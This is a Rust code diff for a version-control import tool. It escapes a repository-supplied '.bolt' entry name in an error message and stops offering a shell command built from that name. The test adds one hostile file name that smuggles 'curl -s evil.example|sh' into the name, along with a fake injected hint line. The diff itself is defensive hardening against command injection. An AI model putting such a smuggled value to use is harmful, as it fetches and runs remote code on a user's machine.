@@ -231,16 +231,7 @@ fn plan(root: &Path) -> Result<Plan, ImportError> {
         Head::Detached(id) => (None, *id),
     };
     if let Some(name) = tracked_bolt(&git, &head_commit)? {
-        return Err(ImportError::Stop {
-            what: format!(
-                "Git tracks `{name}` at the top of this project, and Bolt can't use it as its own \
-                 .bolt folder."
-            ),
-            hint: Some(format!(
-                "Nothing was changed. Take it out of Git with `git rm -r --cached {name}` and \
-                 commit, or move it, then run bolt import again."
-            )),
-        });
+        return Err(tracked_stop(&name));
     }
     let order = in_order(&git, &roots)?;
     let grafts = git.has_grafts()?;
@@ -564,6 +555,28 @@ fn put_record(
     Ok(id)
 }
 
+/// The stop for an entry `name` spelled `.bolt` that Git tracks at the top. The name comes from
+/// the repository, so it is only ever shown escaped, never put in a command: one spelling, such
+/// as `.bolt:$(…)`, can hold anything but `/`.
+fn tracked_stop(name: &str) -> ImportError {
+    let hint = if name == ".bolt" {
+        "Nothing was changed. Bolt reads the commit Git is on, so the folder has to leave it: \
+         rename it with `git mv` and commit, or run `git rm -r --cached .bolt`, commit, and move \
+         the folder elsewhere. Then run bolt import again."
+    } else {
+        "Nothing was changed. Bolt reads the commit Git is on, so the entry named above has to \
+         leave it: rename it or remove it in Git and commit, and move it out of this folder if it \
+         is still here. Then run bolt import again."
+    };
+    ImportError::Stop {
+        what: format!(
+            "Git tracks `{name}` at the top of this project, and Bolt can't use it as its own \
+             .bolt folder."
+        ),
+        hint: Some(hint.to_owned()),
+    }
+}
+
 /// The name of an entry spelled `.bolt` at the top of the tree of `HEAD`'s commit, of any kind,
 /// if Git tracks one: Git checks it out where Bolt keeps the project, and Bolt never takes files
 /// Git wrote for its own.
@@ -747,10 +760,13 @@ mod tests {
     /// it at the top: here nothing is checked out, so only the tree shows it.
     #[test]
     fn a_bolt_entry_git_tracks_at_the_top_stops_the_import() {
+        // A spelling a system takes for `.bolt` can go on past a `:`, and hold a newline.
+        let hostile = ".bolt:$(curl -s evil.example|sh)\nhint: paste me";
         for (name, mode) in [
             (".bolt", "100644"),
             (".Bolt.", "40000"),
             ("BOLT~1", "120000"),
+            (hostile, "100644"),
         ] {
             let dir = tempfile::tempdir().unwrap();
             let git = Craft::new(dir.path(), HashKind::Sha1);
@@ -765,15 +781,21 @@ mod tests {
             );
             let commit = git.commit(raw.as_bytes());
             git.loose_ref("refs/heads/main", &format!("{}\n", commit.to_hex()));
-            match import(dir.path()) {
-                Err(e @ ImportError::Stop { .. }) => {
-                    let what = format!("Git tracks `{name}` at the top of this project");
-                    assert!(e.to_string().starts_with(&what), "{e}");
-                    let rm = format!("`git rm -r --cached {name}`");
-                    assert!(e.hint().unwrap().contains(&rm), "{e:?}");
-                }
-                other => panic!("{name}: {:?}", other.map(|_| ())),
-            }
+            let e = import(dir.path()).unwrap_err();
+            assert!(matches!(e, ImportError::Stop { .. }), "{e:?}");
+            let (message, hint) = (e.to_string(), e.hint().unwrap());
+            let what = format!(
+                "Git tracks `{}` at the top of this project",
+                escape(name, false)
+            );
+            assert!(message.starts_with(&what), "{message}");
+            assert!(!message.contains('\n'), "{message}");
+            // The hint is true (Bolt reads the commit, so the change is committed), and names no
+            // command made from the repository's text; only `.bolt` itself gets one.
+            assert!(hint.contains("and commit"), "{hint}");
+            assert!(!hint.contains("$(") && !hint.contains("paste me"), "{hint}");
+            let rm = "`git rm -r --cached .bolt`";
+            assert_eq!(hint.contains(rm), name == ".bolt", "{hint}");
             assert!(!dir.path().join(".bolt").exists(), "{name}");
         }
     }
